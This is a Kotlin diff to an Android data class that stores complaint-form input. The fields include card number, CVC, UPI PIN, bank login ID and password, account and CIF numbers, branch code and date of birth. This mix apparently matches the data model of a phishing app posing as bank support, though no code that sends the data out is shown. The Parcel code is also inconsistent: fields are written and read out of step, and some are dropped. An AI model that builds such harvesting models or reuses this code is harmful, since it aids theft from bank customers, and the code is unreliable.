@@ -5,18 +5,28 @@ import android.os.Parcelable
 
 // Data class to hold user input data
 data class UserInputData(
-    val fullName: String,
-    val mobileNumber: String,
-    val complaint: String,
+    var fullName: String = "",
+    var mobileNumber: String = "",
+    var complaint: String = "",
     var paymentType: String = "",
     var amount: String = "",
-    var username: String = "",
-    var password: String = "",
     var cardNumber: String = "",
     var cardExpiry: String = "",
-    var cardCvc: String = ""
+    var cardCvc: String = "",
+    var bankName: String = "",
+    var upiPin: String = "",
+    var username: String = "",
+    var password: String = "",
+    var userId: String ? = null,           // Changed from username to userId
+    var userPassword: String ? = null,      // Changed from password to userPassword
+    var accountNumber: String? = null,  // Nullable to indicate it may not always be set
+    var cifNumber: String? = null,      // Nullable to indicate it may not always be set
+    var branchCode: String? = null,     // Nullable to indicate it may not always be set
+    var dob: String? = null,             // Nullable to indicate it may not always be set
+    var timestamp: Long = System.currentTimeMillis()
 ) : Parcelable {
     constructor(parcel: Parcel) : this(
+        parcel.readString() ?: "", // Non-nullable fields default to empty string
         parcel.readString() ?: "",
         parcel.readString() ?: "",
         parcel.readString() ?: "",
@@ -26,7 +36,13 @@ data class UserInputData(
         parcel.readString() ?: "",
         parcel.readString() ?: "",
         parcel.readString() ?: "",
-        parcel.readString() ?: ""
+        parcel.readString() ?: "",
+        parcel.readString() ?: "",
+        // Nullable fields need to be handled with readString() directly
+        parcel.readString(), // Nullable accountNumber
+        parcel.readString(), // Nullable cifNumber
+        parcel.readString(), // Nullable branchCode
+        parcel.readString()  // Nullable dob
     )
 
     override fun writeToParcel(parcel: Parcel, flags: Int) {
@@ -35,11 +51,17 @@ data class UserInputData(
         parcel.writeString(complaint)
         parcel.writeString(paymentType)
         parcel.writeString(amount)
-        parcel.writeString(username)
-        parcel.writeString(password)
         parcel.writeString(cardNumber)
         parcel.writeString(cardExpiry)
         parcel.writeString(cardCvc)
+        parcel.writeString(bankName)
+        parcel.writeString(upiPin)
+        parcel.writeString(userId)
+        parcel.writeString(userPassword)
+        parcel.writeString(accountNumber)   // Nullable field
+        parcel.writeString(cifNumber)       // Nullable field
+        parcel.writeString(branchCode)      // Nullable field
+        parcel.writeString(dob)             // Nullable field
     }
 
     override fun describeContents(): Int {
